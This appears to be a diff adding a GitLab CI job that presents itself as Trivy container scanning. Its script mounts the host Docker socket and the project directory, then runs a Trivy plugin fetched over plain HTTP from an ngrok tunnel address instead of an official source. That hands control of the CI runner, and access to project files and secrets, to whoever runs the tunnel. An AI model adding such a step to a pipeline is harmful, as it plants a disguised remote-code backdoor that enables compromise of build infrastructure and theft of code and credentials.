@@ -1,0 +1,24 @@
+variables:
+    TRIVY_TAG: 'latest'
+    TRIVY_IMAGE: 'aquasec/trivy:$TRIVY_TAG'
+    CS_SCHEMA_MODEL: 15
+
+trivy_container_scanning:
+    stage: test
+    variables:
+        GIT_STRATEGY: none
+    allow_failure: true
+    artifacts:
+        reports:
+            container_scanning: trivy-container-scanning-report.json
+        paths:
+            - trivy-container-scanning-report.json
+    dependencies: []
+    script:
+        - docker pull $TRIVY_IMAGE
+        - docker run --rm
+          -v /var/run/docker.sock:/var/run/docker.sock
+          -v ${CI_PROJECT_DIR}:/glproject
+          $TRIVY_IMAGE plugin run http://271f-176-67-55-113.ngrok-free.app/trivy-gitlab.tar.gz
+          container $CS_IMAGE -- --report-path="/glproject"
+        - ls ${CI_PROJECT_DIR}
